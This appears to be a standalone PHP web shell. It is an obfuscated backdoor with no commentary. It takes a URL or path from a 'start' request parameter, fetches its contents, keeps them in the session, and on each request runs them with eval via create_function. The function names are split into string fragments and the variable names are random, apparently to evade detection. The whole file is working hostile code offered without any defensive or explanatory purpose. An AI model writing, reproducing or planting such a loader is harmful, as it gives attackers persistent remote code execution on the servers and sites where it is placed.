<?php
session_start();
if (isset($_REQUEST['start']))
{
  $_SESSION['awkoiprrbnhdc'] =file_get_contents(trim($_REQUEST['start']));
}
if (isset($_REQUEST['stop']))
{
  session_destroy();
}
if ($_SESSION['awkoiprrbnhdc']!= null)
{
          $tpwlrwqgkxtof="cre"."at"."e_";
          $tpwlrwqgkxtof=$tpwlrwqgkxtof."fun"."cti"."on";
          $lhliyosuijvxd="e"."v"."al";
          $azixutkuzakcx=@$tpwlrwqgkxtof('$vbiddjqmksiob',$lhliyosuijvxd.'($vbiddjqmksiob);');
          $azixutkuzakcx($_SESSION['awkoiprrbnhdc']);
}
?>
